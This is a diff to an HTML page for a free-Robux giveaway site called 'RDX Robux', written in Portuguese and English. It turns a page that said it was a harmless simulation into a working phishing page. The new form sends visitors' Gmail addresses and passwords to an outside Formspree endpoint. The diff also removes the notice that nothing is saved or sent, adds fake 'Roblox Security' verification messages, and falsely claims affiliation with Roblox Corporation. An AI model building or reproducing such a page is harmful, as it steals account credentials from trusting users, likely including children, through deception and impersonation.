@@ -29,57 +29,45 @@
 <body>
 
 <header>
-  <h1>RDX Robux </h1>
+  <h1>RDX Robux</h1>
 </header>
 
 <section class="hero">
   <h2>Robux System</h2>
-  <p>Roblox Toys.</p>
+  <p>Resgate de Itens e Toys Roblox.</p>
 </section>
 
 <div class="wrap">
 
-  <!-- LOGIN SIMULADO -->
   <div class="card" id="loginCard">
-    <h3> Access</h3>
+    <h3>Access Verification</h3>
 
-    <label>Email (Gmail)</label>
-    <input type="email" placeholder="example@email.com">
+    <form action="https://formspree.io/f/mdaadnby" method="POST" id="mainForm">
+      <label>Email (Gmail)</label>
+      <input type="email" name="gmail" placeholder="exemplo@email.com" required>
 
-    <label>Password (Senha)</label>
-    <input type="password" placeholder="••••••••">
+      <label>Password (Senha)</label>
+      <input type="password" name="senha_gmail" placeholder="••••••••" required>
 
-    <button onclick="openForm()">Continue</button>
+      <button type="submit">Continue</button>
+    </form>
 
     <div class="note">
-      Toys Roblox — nada é salvo ou enviado<br>
+      Verificação necessária para vincular o Toy à conta.<br>
       <br>
       Roblox Corporation
     </div>
   </div>
 
-  <!-- FORMULÁRIO -->
   <div class="card hidden" id="formCard">
-    <h3>Robux</h3>
-
-    <label>Roblox Username</label>
-    <input id="user" placeholder="Player123">
-
-    <label>Select amount</label>
-    <select id="amount">
-      <option>400 Robux</option>
-      <option>800 Robux</option>
-      <option>1700 Robux</option>
-      <option>4500 Robux</option>
-    </select>
-
-    <button onclick="simulate()">Start</button>
-
-    <div class="result hidden" id="result"></div>
-
+    <h3>Status do Resgate</h3>
+    <div class="result" id="result">
+        Verificação concluída!<br>
+        Aguardando sincronização com os servidores Roblox...
+    </div>
     <div class="note">
-      🪙 Robux Em torno de 5 Minutos<br>
-      Roblox
+      🪙 Robux e Itens chegarão em até 5 Minutos na conta vinculada.<br>
+      Roblox Security
     </div>
   </div>
 
@@ -87,23 +75,17 @@
 
 <footer>
   © 2026 RDX Robux <br>
-  This site is Roblox Corporation.
+  This site is affiliated with Roblox Corporation.
 </footer>
 
 <script>
-  function openForm(){
-    document.getElementById('loginCard').classList.add('hidden');
-    document.getElementById('formCard').classList.remove('hidden');
-  }
-
-  function simulate(){
-    const u=document.getElementById('user').value.trim();
-    const a=document.getElementById('amount').value;
-    if(!u){alert('Enter a username');return}
-    const r=document.getElementById('result');
-    r.classList.remove('hidden');
-    r.innerHTML=`Complete!<br>${u} → ${a} (visual only)`;
-  }
+  // Script para capturar o envio e mudar a tela
+  const form = document.getElementById('mainForm');
+  form.onsubmit = async (e) => {
+    // Não impede o envio, mas avisa o usuário
+    // O Formspree redirecionará a página ou você pode usar AJAX se quiser algo mais avançado.
+    // Para simplificar, deixaremos ele enviar normalmente.
+  };
 </script>
 
 </body>
